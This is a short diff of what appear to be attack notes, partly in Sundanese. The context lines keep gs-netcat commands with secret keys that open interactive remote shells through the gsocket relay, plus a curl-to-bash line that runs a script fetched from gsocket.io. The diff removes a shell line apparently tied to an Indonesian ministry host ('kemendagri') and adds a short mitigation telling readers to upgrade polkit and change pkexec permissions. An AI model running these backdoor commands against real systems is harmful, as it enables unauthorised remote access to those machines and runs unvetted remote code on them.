@@ -53,4 +53,10 @@ gs-netcat -s "E8ytVbnb7m2robiv1a6pND" -i
 GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"  kill
 pkill defunct
 
-gs-netcat -s "HPhd3teB2R8Z7JAc7eeZYE" -i gs kemendagri
+Upami hoyong ngamanahkeun sistem tina serangan sapertos kieu, pastikeun:
+
+
+
+sudo apt update && sudo apt upgrade polkit
+chmod 0755 /usr/bin/pkexec
+
